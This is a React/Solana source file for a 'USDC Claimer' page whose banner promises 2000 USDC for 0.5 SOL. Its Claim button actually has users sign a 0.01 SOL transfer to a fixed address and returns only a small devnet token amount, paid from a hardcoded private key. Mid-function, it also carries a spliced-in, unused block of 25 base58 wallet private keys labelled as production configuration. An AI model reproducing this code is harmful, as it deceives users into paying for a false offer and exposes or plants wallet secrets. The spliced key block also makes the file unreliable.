/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4Jyuc9ec9VujTf1pMXHTnsv8DadbxtDWNtewsYSmqg11HarX76uv3uScZbkZjHjyJj2Nik88FZSxhoTVWGSzoqnz"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5kMpyweoN4FrvX5qJuMe9q5vkBamAZjhRFUPfoAjLYbZc7RZ2cr9GB5afetwFGmMkbn7ReMKrVzohPyihRsxTioW",
  "key1": "4DMNPRPAZHBn6ndpoMYmLGStw4WaJjGF28JFuhptXGn2WbsQcw6T1qKZQqTGP7RT7ZcUuq86KqA2qedHneiKMAtp",
  "key2": "4im7jJW7hnn2UPvKfbEbyNpGzSQABjev9rhSkpMshwBsGcE6Am5r9zhwPwgLXK1ZwUtBBWhCC8L6uz11fi6iCG1A",
  "key3": "5A1whJCFjFWgCWZ8nrHz6i7PDDKJeRyXdvMkfQqo2aLYSx6cz5cL1WfeHNBeVFqfrEnPnWZLa1HKucKBGPhTkA58",
  "key4": "fMnG4YtF3eQR1RdEJLmEy8DLixciKkHjTTCUm8vmoyTLHZVxiby83JCydbC6Fsy6mE6FarbSHvTQLsnhmPpbVE8",
  "key5": "BBjMbYoxkBK1DiaVanB3SuKKARfaLgxQr2bTRwiUyJMfHxWV8pxtFYuxMp2gK4HpxEfdMHptmb1sQefeGxPhC3q",
  "key6": "4HnYtEVfjSJqnhfQQ2pzj3319rj3YobE4XuRAV77fU2RvNR57Cnu5yR6U2bdTNKUdRxnT8KjmFrftngWPxdFaKcb",
  "key7": "4S7VMqUW8erkQKdeAtzqD3fUXYwRXR3MNKiEpJvohexxkacin6zjxTLWSaEHFUDn8zhQ2g2YQf6pwGJzKnTBDg9j",
  "key8": "4c5evp7rwd4v2Ks9aNTBmEavybdJjjJkCCCnGQ6qPscN7fpsfk3L2hFxB337qtswb5gTTjQ43zhkvTQHrzLdN888",
  "key9": "3LcQPSbcki36bHgcSsZhdkw2SWSjnspBtGceegHxNcRmxsGi91pvYxXDnd4o3HaKru4Ab8ZFuEkmDpX1L2PupeTs",
  "key10": "2QxaNfc8bmzEV7pwnXstZUVDpDKu6ozT2xbsh5fKfwCK6NArghyEU6x6wBdT8ubuKss7nfTpqLKPszU7dumYhhAU",
  "key11": "4fnctehpVHRMYBF6uVtfpKqRX5AFj1PMkjxubb4BCJZC5WQx6aPchnNsRffaN92mJ1PTBtLspsuDsWUiN3H9L8j4",
  "key12": "3r9ncxZMtHHndzXBaxLk1GU7CxKUGxrEMeytXyfvav5uMaLgfNBPQWb5NeWdkdG6smBtZuSyAdQ4ax9Qfe8Fytyu",
  "key13": "5hUWAE9Dmx7qXU3JPHSJWZZQiZiPjDXDrQtEbWgheeRKACcwpzTfUhTnJ2gzCAdpDaGJCe1851scLvyv7K9YAPeq",
  "key14": "5Xuu5gg5gy6mV3bp18AsMDT129kQY4pXVD25M3wBpRE8EXTfnZeHALyLNn8qp81VrsHFzuupqSAToQxCWKkuDMxL",
  "key15": "4QXEVH6zggeFWmj1KQFYN8WfiY4BrQh3nBuqNP3g7ZnK8xCG4yVhuHMzQyZbC58cZDXNNFRCbr5y6ZVjYzbYWuKu",
  "key16": "5ihmLvY5FjoQJbbjgAiaF9sxgxaiT1ierGGoeEhp2yxPnqsy9nRJq62ktJ3uvbjH6h2sPwS9Zo3uREUGB1ZxLrMv",
  "key17": "Vdqbmu2wcp2QVqbzDaaXPXGW5HFAZApwSq5acanVgwHHemtSTxkap3kyZjfW8Pyz7wQk5TQwSh5uvnGNxDNEuCf",
  "key18": "3bjdk5kSsSwjsfdnGwuptULz8trUaXe9pkS3mAMaV8tdZ6GjKjDWNZdqzktwnjoBnCUWkML5v88NBLvQR5ytNzw",
  "key19": "igyBgZxVvRYWiigXthN6CNAnSctiq2hJnf9A8VYWMeCX4YJC7hTXj34shdyV525D5cqXVjaq7ZFyXHcq9bLV2oY",
  "key20": "3QVfpicZkEMkKC32ctjYtXCrqcjgc8YaHNYHUtPqHSZi7zfxoz8x8o6wkzCuRTS38a4GoY54HzknwCWcEa3qWGR2",
  "key21": "622JwaExxRtf7yf77DKxTrAvCruf95crNAKwbsYJhifc32wnryPngYw2Mb17LKt8YkZWgVcMyMzYkGhz76r5rgEV",
  "key22": "5PYjpvNtZtTQHZGaL91jGUT4SFsy3VPGUJoxomSXLHvePHHGy8wVBXfno4KCQikMzaaGGQUYTcWtzivZcfgoQMEA",
  "key23": "3XVRdvQroCMJH1BMFd5vvNEStkezoyGcLVi8Pw63v29MJ4do7YuE99cYCCBm3KkAh4CzWbVh9f4TJvVXJP3VPXyx",
  "key24": "2uJeR4N1ZEytSEKjn1HPfW86yevdVcqM2oVoyf27RZTgpfu2ifygQLTxuytrbwrRej9Hur3uEPUKSvhqdPEvfCWM"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
